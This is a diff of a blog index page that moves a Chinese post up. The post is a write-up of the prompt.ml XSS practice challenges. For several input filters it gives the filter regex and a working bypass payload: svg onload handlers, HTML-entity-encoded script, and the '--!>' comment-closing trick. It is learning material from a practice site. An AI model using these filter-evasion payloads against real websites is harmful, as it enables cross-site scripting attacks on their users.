@@ -80,6 +80,77 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/08/05/2016/xss-3/" title="xss习题集_2" itemprop="url">xss习题集_2</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了</p>
+<p>这几天<del>今天</del>学的是这个练习站: <a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a></p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="lt-gt-过滤"><a href="#lt-gt-过滤" class="headerlink" title="&lt;&gt; 过滤"></a>&lt;&gt; 过滤</h3><blockquote>
+<p>/&lt;\/?[^&gt;]+&gt;/gi</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1) <span class="comment">#注意最后有个空格!!</span></span><br></pre></td></tr></table></figure>
+<p>想了好久, 还是没法构造出<code>&lt;</code>, 最后看了小抄过的, 好蛋疼…<br>然而答案有点出乎意料, 想了一下也有道理, html会自动进行闭合, <code>svg</code>真心不错.<br>不过后面的空格还是不懂为什么存在与否会有这么大区别..</p>
+<h3 id="过滤"><a href="#过滤" class="headerlink" title="(= 过滤"></a>(= 过滤</h3><blockquote>
+<p>input = input.replace(/[=(]/g, ‘’);</p>
+</blockquote>
+<ol>
+<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">prompt.call`<span class="keyword">this</span>, <span class="number">1</span>`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>2.找了半天, 找到了payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>搞了之后才发现svg和script组合简直是无敌了, <code>HTML编码+script</code>(本例用了html10hex)</p>
+<h3 id="gt-替换"><a href="#gt-替换" class="headerlink" title="-&gt; 替换"></a>-&gt; 替换</h3><blockquote>
+<p>input.replace(/-&gt;/g, ‘_’);</p>
+</blockquote>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span><br><span class="line">  --!&gt;&lt;svg/onload=prompt(1)       </span><br><span class="line">--&gt;</span></span><br></pre></td></tr></table></figure>
+<p>payload就是<code>--!&gt;</code>, 还好看了答案, 不然打死都想不到..  这个解析我服!</p>
+<blockquote>
+<p>原文<br>Although the character sequence <code>--!&gt;</code> raises a Parse error, the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/syntax.html#comments" target="_blank" rel="external">HTML Specifications</a> defines the tokenization that makes it an alternative to end a comment:</p>
+</blockquote>
+<h3 id="先到这吧-明天继续"><a href="#先到这吧-明天继续" class="headerlink" title="先到这吧, 明天继续!"></a>先到这吧, 明天继续!</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/08/05/2016/xss-3/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/xss-3/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用" itemprop="url">ES6 模板字符串&amp;&amp;Xss利用</a>
   </h1>
   <p class="article-author">By
@@ -122,77 +193,6 @@
 	
 	  	<span></span>
 		<a href="/08/05/2016/js-template-strings/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/js-template-strings/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/08/05/2016/xss-3/" title="xss习题集_2" itemprop="url">xss习题集_2</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>好久没搞这个了, 再练练几个姿势. 然后打算以后更新xss payload用gist, 养肥了再放blog了</p>
-<p>这几天<del>今天</del>学的是这个练习站: <a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a></p>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="lt-gt-过滤"><a href="#lt-gt-过滤" class="headerlink" title="&lt;&gt; 过滤"></a>&lt;&gt; 过滤</h3><blockquote>
-<p>/&lt;\/?[^&gt;]+&gt;/gi</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=prompt(1) <span class="comment">#注意最后有个空格!!</span></span><br></pre></td></tr></table></figure>
-<p>想了好久, 还是没法构造出<code>&lt;</code>, 最后看了小抄过的, 好蛋疼…<br>然而答案有点出乎意料, 想了一下也有道理, html会自动进行闭合, <code>svg</code>真心不错.<br>不过后面的空格还是不懂为什么存在与否会有这么大区别..</p>
-<h3 id="过滤"><a href="#过滤" class="headerlink" title="(= 过滤"></a>(= 过滤</h3><blockquote>
-<p>input = input.replace(/[=(]/g, ‘’);</p>
-</blockquote>
-<ol>
-<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt.call`this, 1`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>2.找了半天, 找到了payload<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>搞了之后才发现svg和script组合简直是无敌了, <code>HTML编码+script</code>(本例用了html10hex)</p>
-<h3 id="gt-替换"><a href="#gt-替换" class="headerlink" title="-&gt; 替换"></a>-&gt; 替换</h3><blockquote>
-<p>input.replace(/-&gt;/g, ‘_’);</p>
-</blockquote>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span><br><span class="line">  --!&gt;&lt;svg/onload=prompt(1)       </span><br><span class="line">--&gt;</span></span><br></pre></td></tr></table></figure>
-<p>payload就是<code>--!&gt;</code>, 还好看了答案, 不然打死都想不到..  这个解析我服!</p>
-<blockquote>
-<p>原文<br>Although the character sequence <code>--!&gt;</code> raises a Parse error, the <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/syntax.html#comments" target="_blank" rel="external">HTML Specifications</a> defines the tokenization that makes it an alternative to end a comment:</p>
-</blockquote>
-<h3 id="先到这吧-明天继续"><a href="#先到这吧-明天继续" class="headerlink" title="先到这吧, 明天继续!"></a>先到这吧, 明天继续!</h3><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/08/05/2016/xss-3/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/xss-3/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
